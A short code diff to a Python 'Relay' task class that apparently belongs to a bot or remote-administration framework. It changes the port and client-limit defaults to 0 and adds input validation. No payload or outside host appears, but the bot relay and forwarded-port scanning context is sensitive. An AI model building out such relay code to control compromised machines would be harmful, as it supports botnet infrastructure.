@@ -82,9 +82,10 @@ class Relay(Task):
     platforms = ["win32", "linux", "darwin"]
     description = __doc__
     administrator = {"win32": False, "linux": False, "darwin": False}
-    kwargs = {"port": {"type": int, "description": "Port to use. If not set, bot will scan for forwaded ports",
-                       "default": None},
-              "max_clients": {"type": int, "description": "Maximum clients amount", "default": None}}
+    kwargs = {"port": {"type": int, "description": "Port to use. If set to 0, bot will scan for forwaded ports.",
+                       "default": 0},
+              "max_clients": {"type": int, "description": "Maximum clients amount. If set to 0 limit will be disabled.",
+                              "default": 0}}
     stop_if_disconnected = True
 
     def __init__(self, task_id):
@@ -101,12 +102,19 @@ class Relay(Task):
         self._run = threading.Event()
 
     @threaded_task
-    def start(self, port=None, max_client=None, server_ip: str = "127.0.0.1", server_port: int = 8192):
+    def start(self, port=0, max_client=0, server_ip: str = "127.0.0.1", server_port: int = 8192):
         from time import sleep
 
         self.logger.info("Starting task {}".format(self.__class__.__name__))
         ip = socket.gethostbyname(socket.gethostname())
-        if not port:
+
+        if max_client < 0:
+            raise ValueError("Max client amount must be >= 0!")
+
+        if port < 0:
+            raise ValueError("Port must be >= 0!")
+
+        elif port == 0:
             try:
                 port = ForwadedPorts(0)
                 session = port.start()
